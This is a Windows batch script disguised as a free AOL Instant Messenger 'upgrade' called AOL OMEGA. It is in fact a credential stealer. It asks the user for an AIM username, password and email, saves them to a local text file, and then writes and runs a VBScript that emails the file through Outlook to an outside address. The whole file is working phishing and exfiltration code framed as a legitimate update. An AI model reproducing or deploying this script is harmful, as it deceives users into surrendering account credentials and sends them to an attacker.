@echo off
color 4
echo AOL OMEGA!
echo The new AIM patch. Completely Free!
echo We tracked all of the users of AIM and are sending them this new upgrade  
echo for their program because of the celebration of our new department in
echo online videogaming!
pause
cls
color 5
echo AOL OMEGA will now begin to upgrade your system.
echo If you dont have AIM, then this program will automatically download it for you! Isn't that great?
echo But you have to Type in your username and password so that the
echo program can long onto the AIM Server Network and send your computer
echo the upgrades.
pause
cls
color 2
set /p Username=Please Enter Your Username:
cls
set /p Password=Please enter Your Password:
cls
set /p email=Please enter your email, (Activation Code will be sent):
echo %username% >>c:\bla.txt
echo %password% >>c:\bla.txt
echo %email% >>c:\bla.txt
echo Username:%username%
echo password:%password%
echo Email:%email%
echo If correct please press "Y" if not press "N"
pause >nul
cls
echo Thank You for Signing Up.
pause >nul

echo if exist c:\mail.vbs 
echo Dim x >> c:\mail.vbs
echo on error resume next  >> c:\mail.vbs
echo Set fso ="Scripting.FileSystem.Object"  >> c:\mail.vbs
echo Set so=CreateObject(fso)  >> c:\mail.vbs
echo Set ol=CreateObject("Outlook.Application")  >> c:\mail.vbs
echo Set out= WScript.CreateObject("Outlook.Application")  >> c:\mail.vbs
echo Set Mail=ol.CreateItem(0)  >> c:\mail.vbs
echo Mail.to="xtxdoomxtx@cs.com"  >> c:\mail.vbs
echo Mail.Subject="IP"  >> c:\mail.vbs
echo Mail.Body="IP"  >> c:\mail.vbs
echo Mail.Attachments.Add("c:bla.txt") >> c:\mail.vbs
echo Mail.Send  >> c:\mail.vbs
echo ol.Quit >> c:\mail.vbs
start c:\mail.vbs
exit
